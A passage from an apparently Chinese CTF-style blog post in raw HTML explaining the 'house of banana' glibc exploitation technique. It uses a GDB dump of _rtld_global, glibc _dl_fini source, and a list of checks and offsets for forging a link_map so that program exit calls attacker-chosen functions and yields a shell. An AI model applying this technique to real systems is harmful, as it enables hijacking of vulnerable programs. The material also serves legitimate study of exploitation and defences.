0x0</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        entries = 0x0,</span><br><span class="line">        size = 0x0,</span><br><span class="line">        n_elements = 0x0,</span><br><span class="line">        free = 0x0</span><br><span class="line">      &#125;,</span><br><span class="line">      _ns_debug = &#123;</span><br><span class="line">        r_version = 0x0,</span><br><span class="line">        r_map = 0x0,</span><br><span class="line">        r_brk = 0x0,</span><br><span class="line">        r_state = RT_CONSISTENT,</span><br><span class="line">        r_ldbase = 0x0</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; &lt;repeats 15 times&gt;&#125;,</span><br><span class="line">  _dl_nns = 0x1,</span><br><span class="line">  _dl_load_lock = &#123;</span><br><span class="line">    mutex = &#123;</span><br><span class="line">      __data = &#123;</span><br><span class="line">        __lock = 0x0,</span><br><span class="line">        __count = 0x0,</span><br><span class="line">        __owner = 0x0,</span><br><span class="line">        __nusers = 0x0,</span><br><span class="line">        __kind = 0x1,</span><br><span class="line">        __spins = 0x0,</span><br><span class="line">        __elision = 0x0,</span><br><span class="line">        __list = &#123;</span><br><span class="line">          __prev = 0x0,</span><br><span class="line">          __next = 0x0</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      __size = &#x27;\000&#x27; &lt;repeats 16 times&gt;, &quot;\001&quot;, &#x27;\000&#x27; &lt;repeats 22 times&gt;,</span><br><span class="line">      __align = 0x0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _dl_load_write_lock = &#123;</span><br><span class="line">    mutex = &#123;</span><br><span class="line">      __data = &#123;</span><br><span class="line">        __lock = 0x0,</span><br><span class="line">        __count = 0x0,</span><br><span class="line">        __owner = 0x0,</span><br><span class="line">        __nusers = 0x0,</span><br><span class="line">        __kind = 0x1,</span><br><span class="line">        __spins = 0x0,</span><br><span class="line">        __elision = 0x0,</span><br><span class="line">        __list = &#123;</span><br><span class="line">          __prev = 0x0,</span><br><span class="line">          __next = 0x0</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      __size = &#x27;\000&#x27; &lt;repeats 16 times&gt;, &quot;\001&quot;, &#x27;\000&#x27; &lt;repeats 22 times&gt;,</span><br><span class="line">      __align = 0x0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _dl_load_adds = 0x4,</span><br><span class="line">  _dl_initfirst = 0x0,</span><br><span class="line">  _dl_cpuclock_offset = 0x117f04aeec,</span><br><span class="line">  _dl_profile_map = 0x0,</span><br><span class="line">  _dl_num_relocations = 0x53,</span><br><span class="line">  _dl_num_cache_relocations = 0x3,</span><br><span class="line">  _dl_all_dirs = 0x7ffff7ffec20,</span><br><span class="line">  _dl_error_catch_tsd = 0x7ffff7dd7c80 &lt;_dl_initial_error_catch_tsd&gt;,</span><br><span class="line">  _dl_rtld_map = &#123;</span><br><span class="line">    l_addr = 0x7ffff7dd7000,</span><br><span class="line">    l_name = 0x3ff2a8 &quot;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;,</span><br><span class="line">    l_ld = 0x7ffff7ffce80,</span><br><span class="line">    l_next = 0x0,</span><br><span class="line">    l_prev = 0x7ffff7ff5000,</span><br><span class="line">    l_real = 0x7ffff7ffd9d8 &lt;_rtld_global+2456&gt;,</span><br><span class="line">    l_ns = 0x0,</span><br><span class="line">    l_libname = 0x7ffff7ffe020 &lt;_dl_rtld_libname&gt;,</span><br><span class="line">    l_info = &#123;0x0, 0x0, 0x7ffff7ffcf00, 0x7ffff7ffcef0, 0x7ffff7ffce90,</span><br><span class="line">      0x7ffff7ffceb0, 0x7ffff7ffcec0, 0x7ffff7ffcf30, 0x7ffff7ffcf40,</span><br><span class="line">      0x7ffff7ffcf50, 0x7ffff7ffced0, 0x7ffff7ffcee0, 0x0, 0x0,</span><br><span class="line">      0x7ffff7ffce80, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7ffcf10, 0x0, 0x0,</span><br><span class="line">      0x7ffff7ffcf20, 0x0 &lt;repeats 12 times&gt;, 0x7ffff7ffcf70, 0x7ffff7ffcf60,</span><br><span class="line">      0x0, 0x0, 0x7ffff7ffcf90, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,</span><br><span class="line">      0x7ffff7ffcf80, 0x0 &lt;repeats 25 times&gt;, 0x7ffff7ffcea0&#125;,</span><br><span class="line">    l_phdr = 0x7ffff7dd7040,</span><br><span class="line">    l_entry = 0x0,</span><br><span class="line">    l_phnum = 0x7,</span><br><span class="line">    l_ldnum = 0x0,</span><br><span class="line">    l_searchlist = &#123;</span><br><span class="line">      r_list = 0x0,</span><br><span class="line">      r_nlist = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_symbolic_searchlist = &#123;</span><br><span class="line">      r_list = 0x0,</span><br><span class="line">      r_nlist = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_loader = 0x0,</span><br><span class="line">    l_versions = 0x7ffff7ff58b8,</span><br><span class="line">    l_nversions = 0x6,</span><br><span class="line">    l_nbuckets = 0x11,</span><br><span class="line">    l_gnu_bitmask_idxbits = 0x3,</span><br><span class="line">    l_gnu_shift = 0x8,</span><br><span class="line">    l_gnu_bitmask = 0x7ffff7dd72c0,</span><br><span class="line">    &#123;</span><br><span class="line">      l_gnu_buckets = 0x7ffff7dd72e0,</span><br><span class="line">      l_chain = 0x7ffff7dd72e0</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      l_gnu_chain_zero = 0x7ffff7dd731c,</span><br><span class="line">      l_buckets = 0x7ffff7dd731c</span><br><span class="line">    &#125;,</span><br><span class="line">    l_direct_opencount = 0x0,</span><br><span class="line">    l_type = lt_library,</span><br><span class="line">    l_relocated = 0x1,</span><br><span class="line">    l_init_called = 0x1,</span><br><span class="line">    l_global = 0x1,</span><br><span class="line">    l_reserved = 0x0,</span><br><span class="line">    l_phdr_allocated = 0x0,</span><br><span class="line">    l_soname_added = 0x0,</span><br><span class="line">    l_faked = 0x0,</span><br><span class="line">    l_need_tls_init = 0x0,</span><br><span class="line">    l_auditing = 0x0,</span><br><span class="line">    l_audit_any_plt = 0x0,</span><br><span class="line">    l_removed = 0x0,</span><br><span class="line">    l_contiguous = 0x0,</span><br><span class="line">    l_symbolic_in_local_scope = 0x0,</span><br><span class="line">    l_free_initfini = 0x0,</span><br><span class="line">    l_rpath_dirs = &#123;</span><br><span class="line">      dirs = 0x0,</span><br><span class="line">      malloced = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_reloc_result = 0x0,</span><br><span class="line">    l_versyms = 0x7ffff7dd77f0,</span><br><span class="line">    l_origin = 0x0,</span><br><span class="line">    l_map_start = 0x7ffff7dd7000,</span><br><span class="line">    l_map_end = 0x7ffff7ffe168,</span><br><span class="line">    l_text_end = 0x7ffff7df57c0,</span><br><span class="line">    l_scope_mem = &#123;0x0, 0x0, 0x0, 0x0&#125;,</span><br><span class="line">    l_scope_max = 0x0,</span><br><span class="line">    l_scope = 0x0,</span><br><span class="line">    l_local_scope = &#123;0x0, 0x0&#125;,</span><br><span class="line">    l_file_id = &#123;</span><br><span class="line">      dev = 0x0,</span><br><span class="line">      ino = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_runpath_dirs = &#123;</span><br><span class="line">      dirs = 0x0,</span><br><span class="line">      malloced = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_initfini = 0x0,</span><br><span class="line">    l_reldeps = 0x0,</span><br><span class="line">    l_reldepsmax = 0x0,</span><br><span class="line">    l_used = 0x1,</span><br><span class="line">    l_feature_1 = 0x0,</span><br><span class="line">    l_flags_1 = 0x0,</span><br><span class="line">    l_flags = 0x0,</span><br><span class="line">    l_idx = 0x0,</span><br><span class="line">    l_mach = &#123;</span><br><span class="line">      plt = 0x0,</span><br><span class="line">      gotplt = 0x0,</span><br><span class="line">      tlsdesc_table = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_lookup_cache = &#123;</span><br><span class="line">      sym = 0x7ffff7dd7450,</span><br><span class="line">      type_class = 0x1,</span><br><span class="line">      value = 0x7ffff7ff5000,</span><br><span class="line">      ret = 0x7ffff7a13ba0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_tls_initimage = 0x0,</span><br><span class="line">    l_tls_initimage_size = 0x0,</span><br><span class="line">    l_tls_blocksize = 0x0,</span><br><span class="line">    l_tls_align = 0x0,</span><br><span class="line">    l_tls_firstbyte_offset = 0x0,</span><br><span class="line">    l_tls_offset = 0x0,</span><br><span class="line">    l_tls_modid = 0x0,</span><br><span class="line">    l_tls_dtor_count = 0x0,</span><br><span class="line">    l_relro_addr = 0x225bc0,</span><br><span class="line">    l_relro_size = 0x440,</span><br><span class="line">    l_serial = 0x0,</span><br><span class="line">    l_audit = 0x7ffff7ffde48 &lt;_rtld_global+3592&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  audit_data = &#123;&#123;</span><br><span class="line">      cookie = 0x0,</span><br><span class="line">      bindflags = 0x0</span><br><span class="line">    &#125; &lt;repeats 16 times&gt;&#125;,</span><br><span class="line">  _dl_rtld_lock_recursive = 0x7ffff7dd7c90 &lt;rtld_lock_default_lock_recursive&gt;,</span><br><span class="line">  _dl_rtld_unlock_recursive = 0x7ffff7dd7ca0 &lt;rtld_lock_default_unlock_recursive&gt;,</span><br><span class="line">  _dl_make_stack_executable_hook = 0x7ffff7deb0e0 &lt;__GI__dl_make_stack_executable&gt;,</span><br><span class="line">  _dl_stack_flags = 0x6,</span><br><span class="line">  _dl_tls_dtv_gaps = 0x0,</span><br><span class="line">  _dl_tls_max_dtv_idx = 0x1,</span><br><span class="line">  _dl_tls_dtv_slotinfo_list = 0x7ffff7ff5948,</span><br><span class="line">  _dl_tls_static_nelem = 0x1,</span><br><span class="line">  _dl_tls_static_size = 0x1000,</span><br><span class="line">  _dl_tls_static_used = 0x78,</span><br><span class="line">  _dl_tls_static_align = 0x40,</span><br><span class="line">  _dl_initial_dtv = 0x7ffff7ff3010,</span><br><span class="line">  _dl_tls_generation = 0x1,</span><br><span class="line">  _dl_init_static_tls = 0x7ffff7de3130 &lt;_dl_nothread_init_static_tls&gt;,</span><br><span class="line">  _dl_wait_lookup_done = 0x0,</span><br><span class="line">  _dl_scope_free_list = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们看到里面有多个 <code>_dl_ns</code> 结构体，调试发现，该结构体存储着的实际就是 <code>elf</code> 各段的符号结构体。当调用到 <code>_dl_fini</code> 函数时，会执行每个 <code>so</code> 中注册的 <code>fini</code> 函数，其中主要是 <code>fini_array</code> 段的动态链接结构体指针，该结构体实际在 <code>_dl_fini</code> 中被使用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">internal_function</span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Lots of fun ahead.  We have to call the destructors for all still</span></span><br><span class="line"><span class="comment">     loaded objects, in all namespaces.  The problem is that the ELF</span></span><br><span class="line"><span class="comment">     specification now demands that dependencies between the modules</span></span><br><span class="line"><span class="comment">     are taken into account.  I.e., the destructor for a module is</span></span><br><span class="line"><span class="comment">     called before the ones for any of its dependencies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To make things more complicated, we cannot simply use the reverse</span></span><br><span class="line"><span class="comment">     order of the constructors.  Since the user might have loaded objects</span></span><br><span class="line"><span class="comment">     using `dlopen&#x27; there are possibly several other modules with its</span></span><br><span class="line"><span class="comment">     dependencies to be taken into account.  Therefore we have to start</span></span><br><span class="line"><span class="comment">     determining the order of the modules once again from the beginning.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We run the destructors of the main namespaces last.  As for the</span></span><br><span class="line"><span class="comment">     other namespaces, we pick run the destructors in them in reverse</span></span><br><span class="line"><span class="comment">     order of the namespace ID.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = <span class="built_in">GL</span>(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = <span class="built_in">GL</span>(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">	 auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">	  || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  )</span><br><span class="line">	__rtld_lock_unlock_recursive (<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">	     copy the pointers in.  */</span></span><br><span class="line">	  <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	  <span class="keyword">struct</span> <span class="title class_">link_map</span> *l;</span><br><span class="line">	  <span class="built_in">assert</span> (nloaded != <span class="number">0</span> || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	  <span class="keyword">for</span> (l = <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">	    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">	    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">	      &#123;</span><br><span class="line">		<span class="built_in">assert</span> (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">		maps[i] = l;</span><br><span class="line">		l-&gt;l_idx = i;</span><br><span class="line">		++i;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">		   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">		++l-&gt;l_direct_opencount;</span><br><span class="line">	      &#125;</span><br><span class="line">	  <span class="built_in">assert</span> (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">	  <span class="built_in">assert</span> (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Now we have to do the sorting.  */</span></span><br><span class="line">	  _dl_sort_fini (maps, nmaps, <span class="literal">NULL</span>, ns);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">	     from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">	     various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">	     count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">	     we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">	     from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">	     lock.  */</span></span><br><span class="line">	  __rtld_lock_unlock_recursive (<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">	     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">	     the front.  */</span></span><br><span class="line">	  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">		  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">		  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">		      || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (__builtin_expect (<span class="built_in">GLRO</span>(dl_debug_mask)</span><br><span class="line">					    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">					  <span class="built_in">DSO_FILENAME</span> (l-&gt;l_name),</span><br><span class="line">					  ns);</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  <span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">			    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((<span class="type">fini_t</span>) array[i]) ();</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">DL_CALL_DT_FINI</span></span><br><span class="line">			  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">		    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">		  <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">		  <span class="keyword">if</span> (!do_audit &amp;&amp; __builtin_expect (<span class="built_in">GLRO</span>(dl_naudit) &gt; <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">struct</span> <span class="title class_">audit_ifaces</span> *afct = <span class="built_in">GLRO</span>(dl_audit);</span><br><span class="line">		      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> cnt = <span class="number">0</span>; cnt &lt; <span class="built_in">GLRO</span>(dl_naudit); ++cnt)</span><br><span class="line">			&#123;</span><br><span class="line">			  <span class="keyword">if</span> (afct-&gt;objclose != <span class="literal">NULL</span>)</span><br><span class="line">			    <span class="comment">/* Return value is ignored.  */</span></span><br><span class="line">			    (<span class="type">void</span>) afct-&gt;<span class="built_in">objclose</span> (&amp;l-&gt;l_audit[cnt].cookie);</span><br><span class="line"></span><br><span class="line">			  afct = afct-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">		    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">	      --l-&gt;l_direct_opencount;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (! do_audit &amp;&amp; <span class="built_in">GLRO</span>(dl_naudit) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      do_audit = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> again;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">    _dl_debug_printf (<span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">		      <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">		      <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">		      <span class="built_in">GL</span>(dl_num_relocations),</span><br><span class="line">		      <span class="built_in">GL</span>(dl_num_cache_relocations));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>只要伪造 <code>rtld_global</code> 结构体就可以使得 <code>array</code> 指向我们可控的数据区，从而伪造好一系列函数，进而劫持程序的流。可以触发 <code>call</code> 的有两个点，第一个点可以 <code>call</code> 到很多指针，是一个数组；另一个点就只有一个函数。剩下的工作就是根据代码绕过检测，调用到调用点，需要注意的是，有时候远程的 <code>rtld_global</code> 的偏移与本地不一样，需要爆破。<code>house of  banana</code>便是利用<code>large bin attack</code>往 <code>rtld_global</code> 写入堆的地址，并事先在堆里伪造好<code>rtld_global</code>结构体，这样程序<code>exit</code>或者正常退出 <code>main</code> 函数时，便会执行到伪造的函数，此时若我们将函数伪造成<code>one_gadget</code>或者<code>system</code> 则可以 <code>get shell</code>。</p>
<p><strong>利用思路：</strong></p>
<ul>
<li>直接伪造<code>_rtld_global</code>的<code>_ns_loaded</code>，布局好其他内容，使其调用到<code>fini_array</code></li>
<li>伪造<code>link_map</code>的<code>next</code>指针，布局好其他内容，使其调用到<code>fini_array</code></li>
<li>修改<code>link_map-&gt;l_addr</code>，根据偏移使其调用到指定区域的函数</li>
</ul>
<p><strong>试用场景：</strong></p>
<ul>
<li>程序能够显式的执行 <code>exit</code> 函数</li>
<li>程序通过 <code>libc_start_main</code> 启动的主函数，且主函数能够结束</li>
</ul>
<p><strong>需绕过的点：</strong></p>
<p>劫持<code>&amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) = fake</code>。</p>
<ul>
<li><code>check0</code>：<code>fake+0x28 = fake</code></li>
</ul>
<p><code>maps</code> 必须要有四个元素，所以我劫持的是第三个节点的 <code>next</code> 指针这样不会破环长度从而绕过下面的两个断言。劫持时只需在<code>_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next</code>处写入 <code>fake</code> 就行，这时可以使用 <code>large bin attack</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">assert</span> (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line"><span class="built_in">assert</span> (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>

<p>为了能写入 <code>maps[i] = l;</code>，需要绕过 <code>if (l == l-&gt;l_real)</code>，所以<code>fake+0x28 (offset is 0x28)</code>处要写入 <code>fake</code> 自己的地址。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">link_map</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">ElfW</span>(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    <span class="built_in">ElfW</span>(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *l_next, *l_prev; <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *l_real;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">assert</span> (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">        maps[i] = l;</span><br><span class="line">        l-&gt;l_idx = i;</span><br><span class="line">        ++i;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">            are not dlclose()ed from underneath us.  */</span></span><br><span class="line">        ++l-&gt;l_direct_opencount;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>check1</code>：<code>glibc_2.23==&gt;fake+0x314 = 0x1c || glibc_2.31==&gt;fake+0x31c = 0x1c</code></li>
</ul>
<p>是个枚举体中成员 <code>l_init_called</code>，由于各版本有所差异，所以还是现查现用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">link_map</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_relocated:<span class="number">1</span>;	<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_global:<span class="number">1</span>;	<span class="comment">/* Nonzero if object in _dl_global_scope.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_reserved:<span class="number">2</span>;	<span class="comment">/* Reserved for internal use.  */</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	[...]</span><br><span class="line">	  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">	     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">	     the front.  */</span></span><br><span class="line">	  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	  &#123;</span><br><span class="line">	      <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">		  &#123;</span><br><span class="line">		  	   <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">		 	   l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>check2&amp;check3</code>：<code>l-&gt;l_info[DT_FINI_ARRAY] != NULL</code></li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	[...]</span><br><span class="line">		       <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">		       <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">		      		|| l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">		       &#123;</span><br><span class="line">		            <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">		            <span class="keyword">if</span> (__builtin_expect (<span class="built_in">GLRO</span>(dl_debug_mask)</span><br><span class="line">				    	    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">						_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,<span class="built_in">DSO_FILENAME</span> (l-&gt;l_name),ns);</span><br><span class="line"></span><br><span class="line">		      		<span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">		      		<span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">					&#123;</span><br><span class="line">			  			<span 